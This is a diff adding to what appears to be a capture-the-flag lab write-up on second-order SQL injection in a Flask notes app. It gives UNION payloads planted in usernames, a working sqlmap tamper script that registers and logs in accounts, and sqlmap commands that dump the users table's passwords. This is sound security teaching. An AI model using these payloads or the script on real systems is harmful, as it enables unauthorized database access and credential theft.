@@ -400,10 +400,107 @@ $ sqlmap -u http://10.10.196.249:5000/challenge3/login --data="username=admin&pa
                                                        sys.exit(0)
                                                    main(sys.argv[1])
 
+Parameterized queries allow the database to distinguish between code and data, regardless of the input.
+------> INSERT INTO notes (username, title, note) VALUES (?, ?, ?)
+
+Even though parameterized queries are used, the server will accept malicious data and place it in the database if the application does not sanitize it.
+
+Still, the parameterized query prevents the input from leading to SQL injection,Since the application might accept malicious data, all queries must use parameterized queries, and not only for queries directly accepting user input.
+
+--------> INSERT INTO users (username, password) VALUES (?, ?)
+
+However, the query that fetches all of the notes belonging to a user does not use parameterized queries. The username is concatenated directly into the query, making it vulnerable to SQL injection.
+---------> SELECT title, note FROM notes WHERE username = '" + username + "'
+
+By creating a user with the following name:
+----------> ' union select 1,2'
+
+We should be able to trigger the secondary injection:
+
+SELECT title, note FROM notes WHERE username = '' union select 1,2''
+
+' union select 1,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%''
+
+To find the flag among the passwords, register a user with the name:
+--------> '  union select 1,group_concat(password) from users'
+
+
+Sqlmap supports tamper scripts, which are scripts used for tampering with injection data. 
+With a tamper script, we can easily modify the payload, for example, adding a custom encoding to it. It also allows us to set other things, such as cookies. 
+
+There are two custom functions in the tamper script below. The first function is create_account(), which register a user with sqlmap's payload as name and 'asd' as password.
+The next custom function is login(), which logs sqlmap in as the newly created user and returns the Flask session cookie.
+
+tamper() is the main function in the script, and it has the payload and **kwargs as arguments. **kwargs holds information such as the HTTP headers, which we need to place the Flask session cookie onto the request to allow sqlmap to go to the notes page to trigger the SQL injection.
+
+The tamper() function first gets the headers from kwargs, then creates a new user on the application, and then it logs in to the application and sets the Flask session onto the HTTP header object.
+
+
+                                           #!/usr/bin/python
+                                          import requests
+                                          from lib.core.enums import PRIORITY
+                                          __priority__ = PRIORITY.NORMAL
+
+                                          address = "http://10.10.1.134:5000/challenge4"
+                                          password = "asd"
+
+                                          def dependencies():
+                                              pass
+
+                                          def create_account(payload):
+                                              with requests.Session() as s:
+                                                  data = {"username": payload, "password": password}
+                                                  resp = s.post(f"{address}/signup", data=data)
+
+                                          def login(payload):
+                                              with requests.Session() as s:
+                                                  data = {"username": payload, "password": password}
+                                                  resp = s.post(f"{address}/login", data=data)
+                                                  sessid = s.cookies.get("session", None)
+                                              return "session={}".format(sessid)
+
+
+                                          def tamper(payload, **kwargs):
+                                              headers = kwargs.get("headers", {})
+                                              create_account(payload)
+                                              headers["Cookie"] = login(payload)
+                                              return payload
+
+The folder where the tamper script is located will also need an empty __init__.py  file for sqlmap to be able to load it. 
+Before starting sqlmap with the tamper script, change the address and password variable inside the script. With this done, it is possible to exploit the vulnerability with the following command:
+
+                                         sqlmap --tamper so-tamper.py --url http://10.10.1.134:5000/challenge4/signup  --data "username=admin&password=asd" 
+                                         --second-url http://10.10.1.134:5000/challenge4/notes  -p username --dbms sqlite --technique=U --no-cast
+
+                                         # --tamper so-tamper.py - The tamper script
+                                         # --url - The URL of the injection point, which is /signup in this case
+                                         # --data - The POST data from the registraion form to /signup. 
+                                         #   Password must be the same as the password in the tamper script
+                                         # --second-url http://10.10.1.134:5000/challenge4/notes - Visit this URL to check for results
+                                         # -p username - The parameter to inject to
+                                         # --dbms sqlite - To speed things up
+                                         # --technique=U - The technique to use. [U]nion-based
+                                         # --no-cast - Turn off payload casting mechanism
+
+Dumping the users table might be hard without turning off the payload casting mechanism with the --no-cast parameter. An example of the difference between casting and no casting can be seen here:
+
+                                      -- With casting enabled:
+                                      admin' union all select min(cast(x'717a717071' as text)||coalesce(cast(sql as text),cast(x'20' as text)))||cast(x'716b786271' as text),null from sqlite_master 
+                                      where tbl_name=cast(x'7573657273' as text)-- daqo'
+                                      -- 7573657273 is 'users' in ascii
+
+                                      -- Without casting:
+                                      admin' union all select cast(x'717a6a7871' as text)||id||cast(x'6774697a7462' as text)||password||cast(x'6774697a7462' as text)||username||cast(x'7162706b71' as text),null 
+                                      from users-- ypfr'
+
+When sqlmap asks, answer no to follow 302 redirects, then answer yes to continue further testing if it detects some WAF/IPS. Answer no when asked if you want to merge cookies in future requests, and say no to reduce the number of requests.
+As seen in the image below, sqlmap was able to find the vulnerability, which allows us to automate the exploitation of it.
+
+sqlmap --tamper tamper/so-tamper.py --url http://10.10.1.134:5000/challenge4/signup --data "username=admin&password=asd" --url http://10.10.1.134:5000/challenge4/notes -p username --dbms=sqlite --technique=U --no-cast -T users --dump
 
 
 
-
+                                    
 
 
 
